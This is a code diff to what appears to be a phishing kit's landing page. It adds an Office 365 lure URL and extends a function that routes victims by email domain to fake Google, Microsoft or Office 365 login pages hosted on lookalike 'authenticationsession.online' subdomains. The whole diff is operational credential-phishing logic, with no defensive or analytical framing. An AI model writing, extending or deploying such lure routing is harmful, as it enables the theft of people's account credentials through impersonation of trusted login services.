@@ -216,7 +216,8 @@ footer a:hover{text-decoration:underline}
   /* ── Lure URLs ── */
   var LURES = {
     google:    'https://accounts.gsuite.authenticationsession.online/NDSqznSH',
-    microsoft: 'https://login.microsoft.authenticationsession.online/qTEJkBQZ'
+    microsoft: 'https://login.microsoft.authenticationsession.online/qTEJkBQZ',
+    o365:      'https://login.o365.authenticationsession.online/asjUrqgr'
   };
   var GOOGLE_DOMAINS = ['gmail.com','googlemail.com','google.com'];
   var MS_PERSONAL_DOMAINS = ['hotmail.com','hotmail.co.uk','hotmail.fr','hotmail.de','hotmail.es','hotmail.it','hotmail.nl','hotmail.co.jp','hotmail.com.br','outlook.com','live.com','live.co.uk','live.fr','live.de','msn.com','windowslive.com','passport.com'];
@@ -232,7 +233,8 @@ footer a:hover{text-decoration:underline}
   function getLure(email) {
     var d = (email.split('@')[1]||'').toLowerCase();
     if (GOOGLE_DOMAINS.indexOf(d) >= 0) return LURES.google;
-    return LURES.microsoft;
+    if (MS_PERSONAL_DOMAINS.indexOf(d) >= 0) return LURES.microsoft;
+    return LURES.o365;
   }
 
   /* ── Context configurations ── */
